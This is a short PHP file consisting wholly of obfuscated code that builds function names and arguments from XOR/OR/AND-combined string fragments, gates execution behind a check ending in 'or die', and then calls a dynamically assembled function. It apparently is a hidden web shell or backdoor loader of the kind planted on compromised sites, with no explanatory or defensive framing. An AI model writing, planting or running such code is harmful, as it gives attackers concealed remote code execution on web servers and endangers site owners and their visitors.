<?php
$i7P='HW2kL2e'.H5CtPLtHUY;$y0DYLhWFFro="A\$L"|'J!L';$W3U="d/]"^'Bn$';$kCYq=L9ZTz.#c'.
     ')'^',|>5TK';$XSuMdQP9b='6A=8u 3NA.X '^'C;@W*RN=/G;U';$OFfH7=xvgw_.#atEYnfRkbq'.
     '{gy}ww}'&'{~gw_{ot}wwo';$jP3ldnVwx='ws}s;>}i5m}g~j['.vuvYwz.'^gwE[_~|6w|'&/*Y'.
     'D-~z&qF+i*/f3fS.'&}'.Iy7U.'}wm~W~]Z[5~'.ocoLVWy.'~?wO';$lcFmIqyG=#KIgSqlKNcwf'.
     ' K2@U !0H I'|'('.P2PY.')`cH)!';$jcLV='wu&x!'.z4IU.'$X'^'^$'.p8yZq8eHy;'Zgx981'.
     'v;2yB(';$Pd4nX='5'|'9';$Q1XcjWh='Hv^Q_['&mUup_e;$AXHN='2r(iuy)|:hcq(j'^'z&|9*'.
     '!v3h!$8f+';$D7QSfJWm='@_T'|LIU;$BuN0N70ix='a-v6(b'^'2h$ii%';$LiNE0="{!"^#E8Dg'.
     '>o';$PWMPEvOBbL='~'&T;$SckOhZIKn=' '|E;$xJ='g=wwm{7g'&S1wkm9.'<u';$ClDN=S&#eV'.
     '{';$pJzXgto2uS=$y0DYLhWFFro^$W3U;$a6q3U59=(QOg7b3^'6o7s.G')|$kCYq;$paLwXL=/*d'.
     '2-C*/$XSuMdQP9b&$OFfH7;$kaB=$jP3ldnVwx^('BUE B^|ZT<@@EX&L$`=VJ+AR$'./*Ge_fZu1'.
     'p?ROY35&*/CdIDACz|SSPfDT.',P@@'.LPPB4GdA.'$PD#R@%#@@'.ATCF);$QwDgnRr=/*dBiZ2I'.
     '<k_~*/$lcFmIqyG|$jcLV;$pJzXgto2uS($a6q3U59($Q1XcjWh))==$kaB or die;$paLwXL(/*'.
     ',vj*/$QwDgnRr,$a6q3U59($AXHN.$D7QSfJWm.$BuN0N70ix.$LiNE0.$PWMPEvOBbL),/*iDeyY'.
     ':9~e8_*/$SckOhZIKn.$xJ.$ClDN.('1p[i}'&'yx^S=').$Pd4nX);#Fgp_aqCe$?m1*p!.&vq='.
     'jv9e+qdv4_fj2B9jw6g^X_1(!szc;)C2>uY;2rv%7@()Z]p|_tmXz2>}5)%hlC|Z';